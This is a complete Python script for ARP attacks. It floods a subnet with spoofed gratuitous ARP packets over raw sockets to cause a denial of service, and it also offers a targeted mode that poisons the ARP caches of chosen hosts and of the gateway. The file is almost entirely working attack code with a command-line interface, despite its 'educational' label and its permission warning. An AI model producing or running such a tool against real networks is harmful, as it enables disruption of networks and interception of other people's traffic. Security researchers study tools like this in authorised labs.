#!/usr/bin/env python3
"""
ARP DoS via Gratuitous ARP Storm Attack Tool
Educational/Research Purpose Only

This tool implements a Gratuitous ARP Storm attack that can cause DoS conditions
by flooding the network with fake ARP packets, overwhelming network devices.

Author: Security Research Tool
Date: 2025
"""

import socket
import struct
import random
import time
import threading
import argparse
import sys
from typing import List, Tuple

class EthernetFrame:
    """Ethernet Frame Structure"""
    def __init__(self, dst_mac: bytes, src_mac: bytes, ethertype: int = 0x0806):
        self.dst_mac = dst_mac      # 6 bytes
        self.src_mac = src_mac      # 6 bytes  
        self.ethertype = ethertype  # 2 bytes (0x0806 for ARP)
    
    def pack(self) -> bytes:
        """Pack ethernet header into bytes"""
        return struct.pack("!6s6sH", self.dst_mac, self.src_mac, self.ethertype)

class ARPPacket:
    """ARP Packet Structure"""
    def __init__(self, 
                 htype: int = 1,        # Hardware type (Ethernet = 1)
                 ptype: int = 0x0800,   # Protocol type (IPv4 = 0x0800)
                 hlen: int = 6,         # Hardware length (MAC = 6)
                 plen: int = 4,         # Protocol length (IPv4 = 4)
                 operation: int = 2,    # Operation (Reply = 2)
                 sha: bytes = b'\x00' * 6,  # Sender hardware address
                 spa: bytes = b'\x00' * 4,  # Sender protocol address
                 tha: bytes = b'\x00' * 6,  # Target hardware address
                 tpa: bytes = b'\x00' * 4): # Target protocol address
        self.htype = htype
        self.ptype = ptype
        self.hlen = hlen
        self.plen = plen
        self.operation = operation
        self.sha = sha
        self.spa = spa
        self.tha = tha
        self.tpa = tpa
    
    def pack(self) -> bytes:
        """Pack ARP packet into bytes"""
        return struct.pack("!HHBBH6s4s6s4s",
                          self.htype, self.ptype, self.hlen, self.plen,
                          self.operation, self.sha, self.spa, self.tha, self.tpa)

class ARPStormAttacker:
    """Main ARP Storm Attack Class"""
    
    def __init__(self, interface: str = None):
        self.interface = interface
        self.running = False
        self.threads = []
        self.packet_count = 0
        self.lock = threading.Lock()
        
    def ip_to_bytes(self, ip: str) -> bytes:
        """Convert IP string to bytes"""
        return socket.inet_aton(ip)
    
    def mac_to_bytes(self, mac: str) -> bytes:
        """Convert MAC string to bytes"""
        return bytes.fromhex(mac.replace(':', '').replace('-', ''))
    
    def random_mac(self) -> bytes:
        """Generate random MAC address"""
        return bytes([random.randint(0, 255) for _ in range(6)])
    
    def random_ip(self, subnet: str = "192.168.1") -> bytes:
        """Generate random IP in subnet"""
        return self.ip_to_bytes(f"{subnet}.{random.randint(1, 254)}")
    
    def create_gratuitous_arp(self, sender_ip: bytes, sender_mac: bytes) -> bytes:
        """Create a gratuitous ARP packet"""
        # Gratuitous ARP: sender announces its own IP-MAC mapping
        arp = ARPPacket(
            operation=2,        # ARP Reply
            sha=sender_mac,     # Sender MAC
            spa=sender_ip,      # Sender IP
            tha=b'\x00' * 6,   # Target MAC (broadcast/ignored)
            tpa=sender_ip       # Target IP (same as sender - gratuitous)
        )
        return arp.pack()
    
    def create_poisoning_arp(self, target_ip: bytes, fake_mac: bytes, 
                           victim_ip: bytes) -> bytes:
        """Create ARP poisoning packet"""
        arp = ARPPacket(
            operation=2,        # ARP Reply
            sha=fake_mac,       # Fake MAC
            spa=target_ip,      # Target IP we're impersonating
            tha=b'\xff' * 6,   # Broadcast
            tpa=victim_ip       # Victim IP
        )
        return arp.pack()
    
    def create_ethernet_frame(self, arp_payload: bytes, 
                            src_mac: bytes = None, 
                            dst_mac: bytes = b'\xff\xff\xff\xff\xff\xff') -> bytes:
        """Create complete ethernet frame with ARP payload"""
        if src_mac is None:
            src_mac = self.random_mac()
        
        eth_frame = EthernetFrame(dst_mac, src_mac)
        return eth_frame.pack() + arp_payload
    
    def storm_worker(self, target_subnet: str, duration: int, packets_per_second: int):
        """Worker thread for ARP storm"""
        try:
            # Create raw socket
            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))
            if self.interface:
                sock.bind((self.interface, 0))
            
            interval = 1.0 / packets_per_second if packets_per_second > 0 else 0
            start_time = time.time()
            
            print(f"[*] Storm worker started - Target: {target_subnet}.0/24")
            
            while self.running and (time.time() - start_time) < duration:
                try:
                    # Generate random source MAC and IP
                    src_mac = self.random_mac()
                    src_ip = self.random_ip(target_subnet)
                    
                    # Create gratuitous ARP
                    arp_payload = self.create_gratuitous_arp(src_ip, src_mac)
                    frame = self.create_ethernet_frame(arp_payload, src_mac)
                    
                    # Send packet
                    sock.send(frame)
                    
                    with self.lock:
                        self.packet_count += 1
                    
                    if interval > 0:
                        time.sleep(interval)
                        
                except Exception as e:
                    print(f"[!] Error in storm worker: {e}")
                    break
            
            sock.close()
            print(f"[*] Storm worker finished")
            
        except PermissionError:
            print("[!] Permission denied. Run as administrator/root for raw sockets.")
        except Exception as e:
            print(f"[!] Error creating socket: {e}")
    
    def poison_worker(self, target_ips: List[str], gateway_ip: str, duration: int):
        """Worker thread for targeted ARP poisoning"""
        try:
            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))
            if self.interface:
                sock.bind((self.interface, 0))
            
            start_time = time.time()
            fake_mac = self.random_mac()
            
            print(f"[*] Poison worker started - Targets: {len(target_ips)} IPs")
            
            while self.running and (time.time() - start_time) < duration:
                for target_ip in target_ips:
                    if not self.running:
                        break
                    
                    try:
                        # Poison target about gateway
                        arp_payload = self.create_poisoning_arp(
                            self.ip_to_bytes(gateway_ip),
                            fake_mac,
                            self.ip_to_bytes(target_ip)
                        )
                        frame = self.create_ethernet_frame(arp_payload, fake_mac)
                        sock.send(frame)
                        
                        # Poison gateway about target
                        arp_payload = self.create_poisoning_arp(
                            self.ip_to_bytes(target_ip),
                            fake_mac,
                            self.ip_to_bytes(gateway_ip)
                        )
                        frame = self.create_ethernet_frame(arp_payload, fake_mac)
                        sock.send(frame)
                        
                        with self.lock:
                            self.packet_count += 2
                            
                    except Exception as e:
                        print(f"[!] Error poisoning {target_ip}: {e}")
                
                time.sleep(0.1)  # Brief pause between rounds
            
            sock.close()
            print(f"[*] Poison worker finished")
            
        except Exception as e:
            print(f"[!] Error in poison worker: {e}")
    
    def start_storm_attack(self, target_subnet: str = "192.168.1", 
                          duration: int = 60, 
                          num_threads: int = 4, 
                          packets_per_second: int = 100):
        """Start gratuitous ARP storm attack"""
        print(f"[*] Starting ARP Storm Attack")
        print(f"[*] Target Subnet: {target_subnet}.0/24")
        print(f"[*] Duration: {duration} seconds")
        print(f"[*] Threads: {num_threads}")
        print(f"[*] Rate: {packets_per_second} packets/second per thread")
        print(f"[*] Total Rate: {packets_per_second * num_threads} packets/second")
        
        self.running = True
        self.packet_count = 0
        
        # Start worker threads
        for i in range(num_threads):
            thread = threading.Thread(
                target=self.storm_worker,
                args=(target_subnet, duration, packets_per_second)
            )
            thread.daemon = True
            thread.start()
            self.threads.append(thread)
        
        # Monitor progress
        start_time = time.time()
        try:
            while self.running and (time.time() - start_time) < duration:
                time.sleep(5)
                with self.lock:
                    elapsed = time.time() - start_time
                    rate = self.packet_count / elapsed if elapsed > 0 else 0
                    print(f"[*] Packets sent: {self.packet_count}, Rate: {rate:.1f} pps, "
                          f"Elapsed: {elapsed:.1f}s")
        
        except KeyboardInterrupt:
            print("\n[*] Attack interrupted by user")
        
        self.stop_attack()
    
    def start_poison_attack(self, target_ips: List[str], gateway_ip: str, 
                           duration: int = 60):
        """Start targeted ARP poisoning attack"""
        print(f"[*] Starting ARP Poisoning Attack")
        print(f"[*] Targets: {target_ips}")
        print(f"[*] Gateway: {gateway_ip}")
        print(f"[*] Duration: {duration} seconds")
        
        self.running = True
        self.packet_count = 0
        
        # Start poison worker
        thread = threading.Thread(
            target=self.poison_worker,
            args=(target_ips, gateway_ip, duration)
        )
        thread.daemon = True
        thread.start()
        self.threads.append(thread)
        
        # Monitor progress
        start_time = time.time()
        try:
            while self.running and (time.time() - start_time) < duration:
                time.sleep(5)
                with self.lock:
                    elapsed = time.time() - start_time
                    rate = self.packet_count / elapsed if elapsed > 0 else 0
                    print(f"[*] Packets sent: {self.packet_count}, Rate: {rate:.1f} pps")
        
        except KeyboardInterrupt:
            print("\n[*] Attack interrupted by user")
        
        self.stop_attack()
    
    def stop_attack(self):
        """Stop the attack"""
        print("[*] Stopping attack...")
        self.running = False
        
        # Wait for threads to finish
        for thread in self.threads:
            thread.join(timeout=2)
        
        self.threads.clear()
        print(f"[*] Attack stopped. Total packets sent: {self.packet_count}")

def main():
    parser = argparse.ArgumentParser(
        description="ARP DoS via Gratuitous ARP Storm - Educational Tool",
        epilog="Example: python arp_dos_storm.py --storm --subnet 192.168.1 --duration 30"
    )
    
    parser.add_argument('--interface', '-i', 
                       help='Network interface to use')
    parser.add_argument('--storm', action='store_true',
                       help='Launch gratuitous ARP storm attack')
    parser.add_argument('--poison', action='store_true',
                       help='Launch targeted ARP poisoning attack')
    parser.add_argument('--subnet', default='192.168.1',
                       help='Target subnet (default: 192.168.1)')
    parser.add_argument('--targets', nargs='+',
                       help='Target IP addresses for poisoning')
    parser.add_argument('--gateway', default='192.168.1.1',
                       help='Gateway IP for poisoning (default: 192.168.1.1)')
    parser.add_argument('--duration', '-d', type=int, default=60,
                       help='Attack duration in seconds (default: 60)')
    parser.add_argument('--threads', '-t', type=int, default=4,
                       help='Number of threads for storm attack (default: 4)')
    parser.add_argument('--rate', '-r', type=int, default=100,
                       help='Packets per second per thread (default: 100)')
    
    args = parser.parse_args()
    
    if not (args.storm or args.poison):
        parser.print_help()
        print("\n[!] Please specify --storm or --poison attack mode")
        return
    
    print("="*60)
    print("ARP DoS via Gratuitous ARP Storm Attack Tool")
    print("Educational/Research Purpose Only")
    print("="*60)
    print("[!] WARNING: This tool can disrupt network operations!")
    print("[!] Use only on networks you own or have explicit permission to test!")
    print("="*60)
    
    # Get confirmation
    response = input("Continue? (yes/no): ").lower().strip()
    if response != 'yes':
        print("[*] Aborted by user")
        return
    
    attacker = ARPStormAttacker(args.interface)
    
    try:
        if args.storm:
            attacker.start_storm_attack(
                target_subnet=args.subnet,
                duration=args.duration,
                num_threads=args.threads,
                packets_per_second=args.rate
            )
        
        elif args.poison:
            if not args.targets:
                print("[!] Please specify target IPs with --targets")
                return
            
            attacker.start_poison_attack(
                target_ips=args.targets,
                gateway_ip=args.gateway,
                duration=args.duration
            )
    
    except Exception as e:
        print(f"[!] Attack failed: {e}")
    
    finally:
        attacker.stop_attack()

if __name__ == "__main__":
    main()
